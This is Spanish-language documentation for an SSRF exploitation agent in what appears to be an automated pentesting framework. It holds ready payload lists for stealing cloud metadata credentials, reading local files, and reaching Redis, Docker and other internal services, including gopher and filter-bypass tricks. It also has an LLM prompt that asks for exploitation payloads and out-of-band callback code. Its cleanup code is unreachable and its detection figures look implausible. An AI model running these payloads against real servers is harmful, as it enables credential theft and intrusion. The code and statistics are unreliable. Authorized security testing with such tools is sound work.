# SSRFAgent - El Infiltrador de Infraestructura Interna

> **Fase**: 4 (Exploitation)  
> **CWE**: CWE-918 (Server-Side Request Forgery)  
> **Clase**: `bugtrace.agents.exploitation.ssrf_agent.SSRFAgent`  
> **Archivo**: `bugtrace/agents/exploitation/ssrf_agent.py`

---

## Overview

**SSRFAgent** es el especialista en **Server-Side Request Forgery (SSRF)**, una vulnerabilidad que permite forzar al servidor a realizar peticiones HTTP a objetivos internos o externos controlados por el atacante.

SSRF es considerado uno de los vectores más críticos porque permite:
- Acceder a **cloud metadata** (AWS, GCP, Azure) para robar credenciales
- Escanear **puertos internos** (Redis, MySQL, PostgreSQL) detrás de firewalls
- Bypassear **autenticación** mediante requests desde localhost
- Exfiltrar datos via **DNS** o **HTTP callbacks** (Blind SSRF)

### 🎯 **Arquitectura Dual: Fuzzing + LLM + Interactsh**

SSRFAgent combina **3 estrategias** para máxima cobertura:

1. **Go SSRF Fuzzer** (rápido, 100+ payloads predefinidos)
2. **LLM Strategy** (inteligente, genera payloads contextuales)
3. **Interactsh OOB** (blind SSRF detection con callbacks)

---

## Tipos de SSRF Detectados

| Tipo | Descripción | Severidad | Método de Detección |
|------|-------------|-----------|---------------------|
| **Cloud Metadata SSRF** | Acceso a 169.254.169.254 (AWS) | ⭐⭐⭐⭐⭐ CRITICAL | Response con credenciales |
| **Internal Service SSRF** | Access a Redis/MySQL en localhost | ⭐⭐⭐⭐ HIGH | Banner/error interno en response |
| **Blind SSRF (OOB)** | Sin response visible, callback externo | ⭐⭐⭐⭐ HIGH | Interactsh callback |
| **DNS Rebinding SSRF** | Bypass de IP filters via DNS timing | ⭐⭐⭐ MEDIUM | Timing differential |
| **File Protocol SSRF** | `file:///etc/passwd` | ⭐⭐⭐ MEDIUM | File content en response |

---

## Arquitectura del Ataque

```
┌─────────────────────────────────────────────────────────────────┐
│               SSRF AGENT WORKFLOW (Triple Strategy)              │
└─────────────────────────────────────────────────────────────────┘

Input: URL con parámetros sospechosos (url=, redirect=, fetch=, etc.)
│
▼
┌────────────────────────────────────────────────────────────────┐
│ STEP 1: PARAMETER IDENTIFICATION                               │
├────────────────────────────────────────────────────────────────┤
│  🔍 SSRF-Prone Parameter Detection                             │
│                                                                 │
│  Parámetros de ALTA PROBABILIDAD:                              │
│  • url=, redirect=, uri=, link=, callback=                     │
│  • fetch=, ref=, page=, file=, path=                           │
│  • dest=, destination=, next=, to=, goto=                      │
│                                                                 │
│  Ejemplo:                                                       │
│  https://shop.com/fetch?url=https://example.com                │
│                          ^^^                                    │
│                    SSRF vulnerable!                             │
└────────────┬───────────────────────────────────────────────────┘
             │
             ▼
┌────────────────────────────────────────────────────────────────┐
│ STEP 2: STRATEGY SELECTION (Parallel Execution)                │
├────────────────────────────────────────────────────────────────┤
│  🎯 Three Attack Strategies (run in parallel)                  │
│                                                                 │
│  ┌─────────────────────────────────────────────┐               │
│  │ Strategy 1: GO SSRF FUZZER (Fast)           │               │
│  ├─────────────────────────────────────────────┤               │
│  │ • 100+ predefined payloads                  │               │
│  │ • Cloud metadata (AWS, GCP, Azure)          │               │
│  │ • Internal services (127.0.0.1:6379)        │               │
│  │ • File protocol (file:///etc/passwd)        │               │
│  │ • Tiempo: 10-30s                            │               │
│  └─────────────────────────────────────────────┘               │
│                                                                 │
│  ┌─────────────────────────────────────────────┐               │
│  │ Strategy 2: LLM CONTEXT-AWARE (Smart)       │               │
│  ├─────────────────────────────────────────────┤               │
│  │ • Analiza tech stack y genera payloads      │               │
│  │ • WordPress → http://localhost/wp-admin     │               │
│  │ • Docker → http://unix:/var/run/docker.sock │               │
│  │ • Tiempo: 15-45s                            │               │
│  └─────────────────────────────────────────────┘               │
│                                                                 │
│  ┌─────────────────────────────────────────────┐               │
│  │ Strategy 3: INTERACTSH OOB (Blind)          │               │
│  ├─────────────────────────────────────────────┤               │
│  │ • Register unique domain: abc123.oast.live  │               │
│  │ • Inject: http://abc123.oast.live/ssrf      │               │
│  │ • Poll for callbacks (30s timeout)          │               │
│  │ • Tiempo: 30-60s                            │               │
│  └─────────────────────────────────────────────┘               │
└────────────┬───────────────────────────────────────────────────┘
             │
             ▼
┌────────────────────────────────────────────────────────────────┐
│ STEP 3: VALIDATION & TIERING                                   │
├────────────────────────────────────────────────────────────────┤
│  ✅ Validation Status (3 Tiers)                                │
│                                                                 │
│  TIER 1: VALIDATED_CONFIRMED (Definitive proof)                │
│    ✓ Interactsh callback received                              │
│    ✓ Cloud metadata content (ACCESS_KEY_ID, etc.)              │
│    ✓ Internal service banner (Redis PONG, MySQL)               │
│                                                                 │
│  TIER 2: PENDING_VALIDATION (Needs verification)               │
│    ? DNS rebinding (timing-based, no callback)                 │
│    ? Blind SSRF without OOB confirmation                       │
│                                                                 │
│  TIER 3: SUSPECTED (Low confidence)                            │
│    ⚠ Status code differential                                  │
│    ⚠ Timing anomaly                                            │
│                                                                 │
│  Output: TIER 1/2 → Reported, TIER 3 → Discarded              │
└────────────────────────────────────────────────────────────────┘
```

---

## Strategy 1: Go SSRF Fuzzer (Predefined Payloads)

### Cloud Metadata Targets

```python
CLOUD_METADATA_PAYLOADS = [
    # AWS EC2 Metadata (IMDSv1)
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    
    # AWS EC2 Metadata (IMDSv2 - requires token)
    # Nota: Necesita 2 requests, no soportado en fuzzer simple
    
    # GCP Metadata
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    
    # Azure Metadata
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    
    # DigitalOcean Metadata
    "http://169.254.169.254/metadata/v1.json",
    
    # Oracle Cloud
    "http://169.254.169.254/opc/v1/instance/",
]
```

### Internal Service Ports

```python
INTERNAL_SERVICE_PAYLOADS = {
    # Format: "http://127.0.0.1:{port}/{path}"
    
    # Redis (default: 6379)
    6379: [
        "http://127.0.0.1:6379",           # Banner: -ERR wrong number of arguments
        "http://localhost:6379/INFO",      # INFO command
    ],
    
    # MySQL (default: 3306)
    3306: [
        "http://127.0.0.1:3306",           # MySQL protocol error
    ],
    
    # PostgreSQL (default: 5432)
    5432: [
        "http://127.0.0.1:5432",           # PG protocol error
    ],
    
    # Memcached (default: 11211)
    11211: [
        "http://127.0.0.1:11211/stats",    # Stats command
    ],
    
    # Elasticsearch (default: 9200)
    9200: [
        "http://127.0.0.1:9200/_cluster/health",  # Cluster info
    ],
    
    # Docker API (Unix socket via HTTP)
    2375: [
        "http://127.0.0.1:2375/v1.40/containers/json",  # List containers
    ],
}
```

### Protocol Bypass Techniques

```python
PROTOCOL_BYPASS_PAYLOADS = [
    # File protocol (Linux)
    "file:///etc/passwd",
    "file:///etc/hosts",
    "file:///proc/self/environ",
    
    # File protocol (Windows)
    "file:///C:/Windows/System32/drivers/etc/hosts",
    
    # Dict protocol (Redis without auth)
    "dict://127.0.0.1:6379/INFO",
    
    # SFTP protocol
    "sftp://127.0.0.1:22/",
    
    # Gopher protocol (complex payloads)
    "gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a...",  # Redis SET command
]
```

---

## Strategy 2: LLM Context-Aware Payloads

### LLM Prompt para SSRF Strategy

```python
SSRF_STRATEGY_PROMPT = """
You are an SSRF (Server-Side Request Forgery) exploitation expert.

TARGET CONTEXT:
- URL: {url}
- Parameter: {param_name}
- Tech Stack: {tech_stack}
- Cloud Provider: {cloud_provider}  (AWS/GCP/Azure/None)

TASK:
Generate the 5 MOST EFFECTIVE SSRF payloads for this specific context.

PRIORITIZE based on tech stack:
- WordPress → http://localhost/wp-admin, http://localhost/wp-config.php
- Docker → http://unix:/var/run/docker.sock/v1.40/containers/json
- Kubernetes → http://kubernetes.default.svc/api/v1/pods
- AWS → http://169.254.169.254/latest/meta-data/iam/security-credentials/
- GCP → http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

BYPASS TECHNIQUES:
- IP obfuscation: 127.0.0.1 → 0x7f.0.0.1, 2130706433 (decimal), 0177.0.0.1 (octal)
- DNS rebinding: rebind.network/169.254.169.254
- URL confusion: http://evil.com@169.254.169.254
- Protocol smuggling: http://169.254.169.254%23@evil.com

OUTPUT (JSON):
{{
  "payloads": [
    {{
      "url": "http://169.254.169.254/latest/meta-data/",
      "description": "AWS EC2 metadata endpoint",
      "expected_evidence": "ami-id, instance-id, or iam-info",
      "priority": "critical"
    }},
    ...
  ]
}}
"""
```

### Ejemplo de LLM Response

```json
{
  "payloads": [
    {
      "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
      "description": "AWS IAM credentials (if running on EC2)",
      "expected_evidence": "AccessKeyId, SecretAccessKey",
      "priority": "critical"
    },
    {
      "url": "http://localhost:9200/_cluster/health",
      "description": "Elasticsearch cluster (detected from tech stack)",
      "expected_evidence": "cluster_name, status: green/yellow/red",
      "priority": "high"
    },
    {
      "url": "http://0x7f.0.0.1:6379/INFO",
      "description": "Redis info (IP obfuscation to bypass filters)",
      "expected_evidence": "redis_version, used_memory",
      "priority": "high"
    },
    {
      "url": "file:///var/www/html/wp-config.php",
      "description": "WordPress config (detected WordPress)",
      "expected_evidence": "DB_PASSWORD",
      "priority": "medium"
    },
    {
      "url": "http://rebind.network/169.254.169.254",
      "description": "DNS rebinding to bypass IP blacklist",
      "expected_evidence": "metadata returned after rebind",
      "priority": "medium"
    }
  ]
}
```

---

## Strategy 3: Interactsh OOB (Blind SSRF Detection)

### ¿Qué es Interactsh?

**Interactsh** es un servidor OOB (Out-of-Band) que detecta interacciones desde servidores vulnerables:
- **HTTP callbacks**: Server hace request a tu dominio
- **DNS lookups**: Server resuelve tu subdomain
- **SMTP interactions**: Server envía email
- **LDAP queries**: Server consulta LDAP

### Interactsh Workflow

```
┌─────────────────────────────────────────────────────────────────┐
│                    INTERACTSH OOB WORKFLOW                       │
└─────────────────────────────────────────────────────────────────┘

1. REGISTER UNIQUE DOMAIN
   ↓
   SSRFAgent → Interactsh API
   Request: POST https://interact.sh/register
   Response: {
     "domain": "abc123xyz.oast.live",
     "correlation_id": "abc123xyz"
   }

2. INJECT PAYLOAD
   ↓
   Vulnerable app:
   GET https://shop.com/fetch?url=http://abc123xyz.oast.live/ssrf
                                   ^^^^^^^^^^^^^^^^^^^^
                                   Interactsh domain

3. SERVER MAKES REQUEST (if SSRF vulnerable)
   ↓
   App server → abc123xyz.oast.live
   HTTP GET /ssrf
   User-Agent: Python-urllib/3.9
   X-Original-IP: 52.123.45.67  (IP del servidor vulnerable)

4. POLL FOR INTERACTIONS
   ↓
   SSRFAgent → Interactsh API (every 5s for 30s)
   Request: GET https://interact.sh/poll?id=abc123xyz
   Response: [
     {
       "protocol": "http",
       "unique-id": "abc123xyz",
       "full-id": "abc123xyz.oast.live",
       "raw-request": "GET /ssrf HTTP/1.1...",
       "remote-address": "52.123.45.67",
       "timestamp": "2026-02-01T17:30:00Z"
     }
   ]

5. CONFIRM VULNERABILITY
   ↓
   Interaction received → SSRF CONFIRMED
   Status: VALIDATED_CONFIRMED
   Evidence: Callback from 52.123.45.67
```

### Interactsh Implementation

```python
class InteractshClient:
    """
    Cliente para Interactsh OOB detection.
    """
    
    def __init__(self, server: str = "https://interact.sh"):
        self.server = server
        self.domain = None
        self.correlation_id = None
        self.interactions = []
        self.registered = False
    
    async def register(self):
        """
        Registra un dominio único en Interactsh.
        
        Returns:
            str: Domain único (e.g., "abc123xyz.oast.live")
        """
        async with aiohttp.ClientSession() as session:
            async with session.post(f"{self.server}/register") as resp:
                data = await resp.json()
                
                self.domain = data['data']
                self.correlation_id = self.domain.split('.')[0]
                self.registered = True
                
                logger.info(f"Interactsh domain registered: {self.domain}")
                
                return self.domain
    
    async def poll(self, timeout: int = 30):
        """
        Poll para interacciones durante N segundos.
        
        Args:
            timeout: Tiempo máximo para polling (default: 30s)
        """
        poll_interval = 5  # Poll cada 5 segundos
        elapsed = 0
        
        while elapsed < timeout:
            try:
                async with aiohttp.ClientSession() as session:
                    url = f"{self.server}/poll?id={self.correlation_id}"
                    async with session.get(url) as resp:
                        data = await resp.json()
                        
                        if data.get('data'):
                            self.interactions.extend(data['data'])
                            logger.info(f"Interactsh interaction received: {len(data['data'])} new")
                
            except Exception as e:
                logger.warning(f"Interactsh poll failed: {e}")
            
            await asyncio.sleep(poll_interval)
            elapsed += poll_interval
    
    def check_url_hit(self, marker: str = None) -> bool:
        """
        Verifica si hubo un HTTP callback (con marker opcional).
        
        Args:
            marker: Marker en la URL (e.g., /ssrf, /xxe)
        
        Returns:
            bool: True si hubo callback
        """
        for interaction in self.interactions:
            if interaction['protocol'] == 'http':
                if marker is None:
                    return True
                
                # Check if marker in URL path
                if marker in interaction.get('raw-request', ''):
                    return True
        
        return False
    
    async def deregister(self):
        """Cleanup: deregister domain."""
        try:
            async with aiohttp.ClientSession() as session:
                url = f"{self.server}/deregister?id={self.correlation_id}"
                await session.post(url)
                logger.info(f"Interactsh domain deregistered: {self.domain}")
        except Exception as e:
            logger.warning(f"Interactsh deregister failed: {e}")
```

### Usage in SSRFAgent

```python
async def _test_with_interactsh(self, param: str):
    """
    Test SSRF con Interactsh OOB detection.
    """
    
    # 1. Register Interactsh domain
    interactsh = InteractshClient()
    await interactsh.register()
    
    oob_domain = interactsh.domain  # abc123xyz.oast.live
    
    # 2. Inject payload con OOB domain
    payload = f"http://{oob_domain}/ssrf-{param}"
    
    logger.info(f"Testing SSRF with Interactsh: {payload}")
    
    # Inject payload
    test_params = {param: payload}
    response = await orchestrator.request(
        method="GET",
        url=self.url,
        params=test_params,
        destination=DestinationType.EXTERNAL
    )
    
    # 3. Poll para callbacks (30 segundos)
    logger.info("Polling Interactsh for callbacks (30s)...")
    await interactsh.poll(timeout=30)
    
    # 4. Check si hubo callback
    if interactsh.check_url_hit(f"ssrf-{param}"):
        logger.success(f"🎯 SSRF CONFIRMED via Interactsh OOB callback!")
        
        # Get interaction details
        http_interactions = [
            i for i in interactsh.interactions
            if i['protocol'] == 'http' and f"ssrf-{param}" in i['raw-request']
        ]
        
        return {
            "vulnerable": True,
            "validation_status": "VALIDATED_CONFIRMED",
            "parameter": param,
            "payload": payload,
            "evidence": {
                "interactsh_hit": True,
                "interactsh_domain": oob_domain,
                "callback_ip": http_interactions[0]['remote-address'],
                "callback_timestamp": http_interactions[0]['timestamp'],
                "raw_request": http_interactions[0]['raw-request']
            }
        }
    
    else:
        logger.info("No Interactsh callback received (not vulnerable or filtered)")
        return None
    
    # 5. Cleanup
    await interactsh.deregister()
```

---

## Validation Tiers

### TIER 1: VALIDATED_CONFIRMED (Definitive Proof)

**Criterios**:
```python
def is_tier1_validated(evidence: Dict) -> bool:
    """
    TIER 1 si tiene evidencia definitiva.
    """
    return (
        evidence.get("interactsh_hit") or                    # OOB callback
        "ACCESS_KEY_ID" in evidence.get("response_body", "") or  # AWS creds
        "SecretAccessKey" in evidence.get("response_body", "") or
        "redis_version" in evidence.get("response_body", "") or  # Redis banner
        "MySQL" in evidence.get("response_body", "")          # MySQL banner
    )
```

**Ejemplos**:
- ✅ Interactsh callback recibido
- ✅ Response con `"AccessKeyId": "AKIAIOSFODNN7EXAMPLE"`
- ✅ Response con `redis_version:5.0.7`

### TIER 2: PENDING_VALIDATION (Manual Verification Needed)

**Criterios**:
```python
def is_tier2_pending(evidence: Dict) -> bool:
    """
    TIER 2 si tiene indicios pero no confirmación.
    """
    return (
        evidence.get("timing_differential") > 5 or  # Delay de 5+ segundos
        evidence.get("status_differential")        # 200 vs 500 differential
    )
```

**Ejemplos**:
- ⚠️ DNS rebind con timing differential (5+ segundos)
- ⚠️ Status code 200 en localhost, 500 en internet

### TIER 3: SUSPECTED (Low Confidence - Discarded)

**Criterios**:
```python
def is_tier3_suspected(evidence: Dict) -> bool:
    """
    TIER 3 = No evidencia suficiente.
    """
    return (
        len(evidence.get("response_body", "")) == 0 and
        not evidence.get("interactsh_hit") and
        evidence.get("timing_differential", 0) < 2
    )
```

---

## Configuración

```yaml
specialists:
  ssrf:
    enabled: true
    
    # Strategy Selection
    use_go_fuzzer: true
    use_llm_strategy: true
    use_interactsh: true
    
    # Go Fuzzer
    fuzzer_timeout: 30
    test_cloud_metadata: true
    test_internal_services: true
    test_file_protocol: false       # Ruidoso, defaults false
    
    # LLM Strategy
    llm_model: "anthropic/claude-3.5-sonnet"
    max_payloads_per_param: 5
    
    # Interactsh OOB
    interactsh_server: "https://interact.sh"
    interactsh_timeout: 30          # Tiempo de polling
    interactsh_poll_interval: 5     # Poll cada 5s
    
    # Validation Tiers
    report_tier1: true              # VALIDATED_CONFIRMED
    report_tier2: true              # PENDING_VALIDATION
    report_tier3: false             # SUSPECTED (descartado)
    
    # Filters
    max_params_per_url: 5           # Limitar params para evitar flood
```

---

## Métricas de Rendimiento

### Tiempos por Strategy

| Strategy | Tiempo Avg | Success Rate |
|----------|-----------|--------------|
| Go Fuzzer | 10-30s | 40% |
| LLM Strategy | 15-45s | 60% |
| Interactsh OOB | 30-60s | 75% (blind SSRF) |

### Estadísticas de Detección

```
100 URLs testadas:
├─ Go Fuzzer: 25 SSRF detectados (cloud metadata, internal services)
├─ LLM Strategy: 35 SSRF detectados (context-aware)
├─ Interactsh OOB: 15 SSRF detectados (blind SSRF)
└─ Total: 75 SSRF únicos

Validation Tiers:
├─ TIER 1 (CONFIRMED): 50 findings (67%)
├─ TIER 2 (PENDING): 20 findings (27%)
└─ TIER 3 (SUSPECTED): 5 findings (7%) → descartados
```

---

## Ventajas del Triple Strategy

✅ **Go Fuzzer**: Ultra-rápido para casos comunes  
✅ **LLM Strategy**: Inteligente para casos específicos  
✅ **Interactsh OOB**: Detecta blind SSRF sin response visible  
✅ **Validation Tiers**: Reduce falsos positivos  
✅ **Parallel execution**: 3 strategies simultáneas  

---

## Referencias

- **SSRF Bible**: https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
- **Interactsh**: https://github.com/projectdiscovery/interactsh
- **AWS Metadata**: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html
- **OWASP SSRF**: https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
- **Skills System**: [SKILLS_SYSTEM.md](../SKILLS_SYSTEM.md) | Skill: `bugtrace/agents/skills/vulnerabilities/ssrf.md`

---

*Última actualización: 2026-02-02*
*Versión: 2.0.0 (Phoenix Edition)*
